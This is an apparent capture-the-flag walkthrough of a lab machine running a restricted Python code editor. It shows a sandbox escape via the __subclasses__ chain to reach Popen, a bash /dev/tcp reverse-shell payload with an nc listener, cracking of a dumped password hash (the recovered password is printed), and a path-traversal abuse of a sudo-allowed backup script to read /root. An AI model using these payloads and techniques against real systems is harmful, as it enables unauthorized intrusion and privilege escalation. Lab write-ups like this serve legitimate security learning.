- we start with an nmap scan 
```
nmap -sC -sV 10.10.11.62
```

- we see that there are 2 ports available:
	- 22 - ssh server
	- 5000 - http, Python Code Editor

I enter the on the browser on the IP and port `10.10.11.62/5000` and I am greeted with a python code editor
- On the left part you can write python code and on the right part you get the output
- It has some buttons:
	- `Run` - runs the code 
	- `Save` - saves the code
	- `Login` - you can login
	- `Register` - you can register your account
	- `About` - not too much

- `Login` and `Register` do nothing so I go back to the code section

- I try to import the `os` module and try to get some info about the system but I am hit with the message `Use of restricted keywords...`
- So I cannot use import or `os` or other helpful things 

- After working with chatgpt and watch some walkthroughs I learn the fact that I can use some commands to see what classes I can use:

- I run the next script and boom a lot of classes:
```python
print(().__class__.__base__.__subclasses__())
```

- I try to search something useful and again with help of chatgpt and some walkthroughs and my OS course from university I discover that I have `Popen` so I can execute commands 
- The next command helps me access `Popen`
```python
print(().__class__.__base__.__subclasses__())[317](<command>)
```

- I will try to get a reverse shell
- I open a listener with `netcat` on my system
```shell
nc -lvnp 4444
```

- On the website I input the next code to get the reverse shell:
```python
().__class__.__bases__[0].__subclasses__()[317](  
"bash -c 'bash -i >& /dev/tcp/<your_IP>/4444 0>&1'", shell=True, stdout=-1).communicate()
```

- I got a reverse shell as the user `app-production`

- By going through the file I find `user.txt` with the user flag
#### Root flag
- By going through the files of the user I found a file named `database.db`
- I open it with `sqlite3` and then write `select * from user;` and I got 2 users and their hash passwords
![[Pasted image 20250706141348.png]]

- Then I use [CrackStation](https://crackstation.net/) to crack the hash for `martin` and I got:
	 - user `martin`
	 - password `nafeelswordsmaster`

- Then I ssh into the system with the credentials above:
```shell
ssh martin@10.10.11.62
password: nafeelswordsmaster
```

- I am in so, I wander through the system but I get nothing, but a file is right in my `home/backups` folder that seems interesting `task.json`  
- `task.json` is a file that shows 2 interesting things:
	- A `destination` field where I can write the path to a destination
	- A `directories_to_archive` field where I can select multiple directories which I can archive
- So I understand that there is somehow a way to archive directories from where ever I want and place the archive where ever I want

- After I didn't got any ideas I searched for a walkthrough where it suggested to try to use:
```
sudo -l
```
to get information about what I can do with the `sudo` command with my current user

- And I got the next:
```txt
.....
User martin may run the following commands on localhost:
	(ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

- I run the command `backy.sh` but I get the following output message:
```shell
Usage: /usr/bin/backy.sh <task.json>
```
- so that means I need a `.json` file

- I try with the `task.json` file found earlier and I see that it tries to archive the directory that was in the `directories_to_archive` field 

- So let's try to archive the `root` directory into my home directory
- I copy and modify the `task.json` into a new file `root.json`
```JSON
{
  "destination": "/home/martin/",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/home/....//root"
  ]
}
```
- Then I run:
```shell
sudo /usr/bin/backy.sh root.json
```
 - And I get the `/root` directory archived in `martin` `/home` directory

- I extract it with:
```shell
tar -xvf code_home_.._root_2025_July.tar.bz2
```

- And there it is the `root.txt`
```shell
cat root/root.txt
```